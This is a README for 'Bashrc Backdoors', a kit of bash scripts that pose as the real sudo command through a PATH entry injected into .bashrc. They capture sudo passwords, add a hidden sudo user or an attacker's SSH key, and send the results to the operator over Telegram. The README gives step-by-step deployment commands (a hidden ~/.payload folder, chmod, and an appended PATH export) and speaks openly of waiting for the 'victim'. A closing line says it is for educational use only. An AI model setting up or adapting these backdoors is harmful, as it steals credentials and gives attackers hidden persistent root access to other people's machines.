# .Bashrc Backdoors
Bashrc Backdoors are a collection of bash scripts that can be used to take advantage of the .bashrc file (also compatible with .zshrc and others) as a payload in any shell in order to trick the user and escalate privileges or getting various passwords. Then all loots will be send via Telegram on the associated account.

Each script has a different function such as getting sudo password or create a new user with sudo privilege, get SSH or GitHub password in function of your needs. And all scripts are designed to mimic real shell function behavior. This means that the person who is using the shell will not suspect anything.

![Bashrc backdoors logo](https://i.ibb.co/3RMHbcJ/bashrc-backdoors-logo.png)

For the moment only 3 scripts are available, `sudo-telegram.sh`, `adduser-telegram.sh`, `addpubkey-telegram.sh`. And 2 others are coming soon `github-telegram.sh` and `ssh-telegram.sh`.

### Scripts Description

* `sudo-telegram.sh`: Grab and send the sudo password via telegram once the sudo command is used. 
* `adduser-telegram.sh`: Create a new user on the host machine with sudo privilege and send all information via telegram once the sudo command is used.
* `addpubkey-telegram.sh`: Copy and append the id_rsa.pub key defined in the script into ~/.ssh/authorized_keys, then a confirmation message will be send via telegram once the sudo command is used.
* `github-telegram.sh`: Will, grab and send GitHub username and password via telegram once the commands git push or git pull is used.
* `ssh-telegram.sh`: Will, grab and send SSH information via telegram when the user wants to connect to another server using SSH command.

### Requirement

* Telegram account (API key and chatID)
* A target host :) (Tested on CentOs 7 and Ubuntu 20.04)

### How to use

The first thing to do to use any Bashrc Backdoors script is to add Telegram API information into it.
```bash
telegramApiToken="<API:TOKEN>"
telegramChatID="<chatID>"
```
Note*: If your are using `addpubkey-telegram.sh` your SSH public key will be also required.

Once Telegram information added, let's create a hidden folder and import the bash script into it. (For the following example, I used the script `sudo-telegram.sh` but it's the same for all).
 ```bash
mkdir ~/.payload
#Copy the content of sudo-telegram.sh in ~/.payload/sudo.
vi ~/.payload/sudo
```

The next step is to make the bash script executable.
```bash
chmod a+x ~/.payload/sudo
```
And the last step is to load our bash script in .bashrc file.
 ```bash
echo "export PATH=~/.payload:$PATH" >> ~/.bashrc
```
Note*:  Adapt the command according to the shell used (.zshrc, etc..).

That's all! If the payload is correctly injected into the .bachrc file, then, the last thing to do is to wait for the victim to login and use the sudo command to receive the sudo password via Telegram.

### Proof of concept
(POC using the bash script `sudo-telegram.sh` on CentOS 7)

[![Video POC ssh-telegram.sh](https://i.ibb.co/7gXHL9q/500px-youtube-social-play.png)](https://www.youtube.com/watch?v=FJM50rUQydg)


### Contribution
If you have any funny scripting ideas or simply want to make improvements in the existing scripts, feel free to add your pull request!

### Note
FOR EDUCATIONAL PURPOSE ONLY.
